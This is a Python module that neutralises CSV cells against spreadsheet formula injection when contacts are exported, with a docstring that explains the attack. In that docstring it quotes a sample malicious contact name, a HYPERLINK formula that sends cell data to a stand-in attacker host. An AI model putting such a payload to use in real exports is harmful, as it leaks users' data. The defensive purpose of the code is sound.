"""
Writing CSV that is safe to open in a spreadsheet.

A CSV export is not just a file: it is a file the customer double-clicks, and
Excel, LibreOffice and Google Sheets all treat a cell beginning with ``=``,
``+``, ``-`` or ``@`` as a *formula* rather than text. So a contact saved with
the name

    =HYPERLINK("https://attacker.example/?"&A1,"Click here")

is inert everywhere in this product -- it is escaped in the UI and it is just
characters in the database -- right up until somebody exports their contacts
and opens the file, at which point it executes on their machine with their
data. The attacker never needed access to the export; they only needed to be
in the contact list, which for a WhatsApp marketing tool means they only
needed to message the business.

The fix is one character. A leading apostrophe makes a spreadsheet treat the
rest of the cell as literal text, and it is what every spreadsheet honours.
The alternative -- stripping the character -- silently corrupts a legitimate
value, and phone numbers and negative amounts legitimately start with ``-``
and ``+`` all the time.

``\\t``, ``\\r`` and ``\\n`` are prefixed too: a leading tab or newline is
consumed while the cell is parsed, so ``\\t=cmd`` reaches the formula parser as
``=cmd`` and defeats a check that only looks at the first character.
"""

#: Characters that make a spreadsheet read a cell as a formula, plus the
#: whitespace that hides one from a naive first-character check.
FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r", "\n")


class EchoBuffer:
    """A file-like object csv.writer can write one row into at a time, for streaming CSV responses."""

    def write(self, value):
        return value


def csv_safe(value):
    """
    One cell, neutralised for spreadsheets.

    Non-strings are returned untouched: an int, a bool, a `datetime` and `None`
    cannot carry a formula, and quoting them here would turn a date column into
    a text column in every export.
    """
    if not isinstance(value, str) or not value:
        return value
    if value[0] in FORMULA_PREFIXES:
        return "'" + value
    return value


def csv_safe_row(values):
    """`csv_safe` across a whole row. Use this rather than remembering per cell."""
    return [csv_safe(value) for value in values]
